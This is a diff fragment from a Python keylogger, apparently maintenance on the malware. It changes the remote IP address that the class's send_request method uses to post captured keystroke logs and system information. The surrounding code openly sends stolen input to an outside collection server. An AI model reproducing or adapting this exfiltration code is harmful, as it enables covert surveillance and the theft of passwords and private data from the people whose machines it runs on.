@@ -15,7 +15,7 @@ class Keylogger:
     def send_request(self):
         try:
             requests.post(
-                "http://34.31.112.198:3475",
+                "http://34.70.137.47:3475",
                 json={"log": self.log, "system_info": self.system_info},
                 timeout=5
             )
